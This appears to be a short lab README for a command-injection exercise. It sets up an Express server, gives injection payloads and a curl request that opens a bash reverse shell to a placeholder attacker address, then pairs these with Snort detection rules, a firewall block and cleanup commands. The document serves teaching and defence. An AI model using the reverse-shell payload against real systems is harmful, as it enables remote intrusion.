## Running the Server

To run the Server, follow these steps:

### Install npm
```bash
sudo apt install npm
```

### Install Express.js using npm:

```bash
npm install express
```

### Run the server:

```bash
node server.js
```

### Payload

Use the following payloads for testing:

```plaintext
google.com; id
google.com&&id
```

```bash
# Setup a Netcat listener On Kali
nc nc -lnvp 4444

#  Send request with payload
curl "http://{dest_id}:{dest_port}/execute?cmd=ping&target=google.com;bash+-c+'bash+-i+>%26+/dev/tcp/{src_ip}/{src_port}+0>%261'"
```

### Detecting Semicolons in Input with Snort

To detect semicolons in input, use the following Snort rule:

```plaintext
alert tcp any any -> $HOME_NET 3000 (msg:"Possible command injection attempt - semicolon in input (\;)"; content:"|3B|"; nocase; sid:1000001; rev:1;)
```

### Detecting Multiple Commands in Input with Snort

To detect multiple commands in input, use the following Snort rule:

```plaintext
alert tcp any any -> $HOME_NET 3000 (msg:"Possible command injection attempt - multiple commands in input (&&)"; content:"|26 26|"; nocase; sid:1000002; rev:1;)
```

### Run Snort
```
sudo snort -A console -c /etc/snort/snort.conf
```

### Deny traffic from Kali on Ubuntu Desktop
```
sudo ufw status
sudo ufw enable
sudo ufw deny from 192.168.1.114 to any
sudp ufw status
```

### Checking All Active Network Connections
```
netstat -tunpa | grep ESTABLISHED
ps -aux | grep bash
```

### Kill it 
```
kill -9 {pid} {pid} {pid}
```